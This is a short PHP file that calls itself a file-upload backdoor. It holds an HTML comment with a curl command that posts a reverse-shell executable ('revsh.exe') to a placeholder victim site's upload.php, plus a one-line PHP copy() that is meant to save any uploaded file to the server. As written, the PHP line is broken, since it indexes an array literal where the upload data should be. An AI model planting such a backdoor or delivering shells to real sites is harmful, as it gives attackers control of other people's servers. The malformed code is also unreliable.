<!-- 
this is a PHP-file upload backdoor
You might use it like:
curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@revsh.exe" http://victimsite.com/upload.php

-- OR --
run uploader.html locally
-->



<?php copy(['file']['tmp_name'],['file']['name']);?> 
